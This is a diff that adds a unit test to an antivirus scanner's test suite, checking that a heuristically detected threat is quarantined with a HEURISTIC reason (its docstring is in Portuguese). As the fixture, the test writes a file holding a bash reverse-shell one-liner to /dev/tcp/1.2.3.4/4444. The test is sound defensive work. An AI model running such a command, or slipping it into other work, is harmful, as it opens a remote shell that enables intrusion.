@@ -602,3 +602,30 @@ class TestScanEnginePaths:
         f.write_text("safe content")
         eng.scan_file(f)
         mock_quar.quarantine_file.assert_not_called()
+
+    def test_auto_quarantine_reason_is_heuristic_for_heuristic_threat(
+        self, cfg: ConfigManager, sig_db: SignatureDB, tmp_path: Path
+    ) -> None:
+        """Ameaça vinda de detecção heurística (não assinatura) deve
+        quarentenar com QuarantineReason.HEURISTIC, não SIGNATURE_MATCH
+        (achado real desta rodada — antes ficava sempre hardcoded pra
+        SIGNATURE_MATCH mesmo quando a origem era o HeuristicEngine)."""
+        from ekprotection.heuristics.engine import HeuristicEngine
+        from ekprotection.quarantine.models import QuarantineReason
+
+        cfg.set("quarantine.auto_quarantine_critical", True)
+        mock_quar = MagicMock()
+        heur = HeuristicEngine(cfg)
+        eng  = ScanEngine(cfg, sig_db=sig_db, quar_manager=mock_quar,
+                          heuristic_engine=heur)
+
+        f = tmp_path / "evil.sh"
+        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
+
+        r = eng.scan_file(f)
+
+        assert r.is_critical is True
+        assert r.threat_type == "Heuristic"
+        mock_quar.quarantine_file.assert_called_once()
+        _, kwargs = mock_quar.quarantine_file.call_args
+        assert kwargs["reason"] == QuarantineReason.HEURISTIC
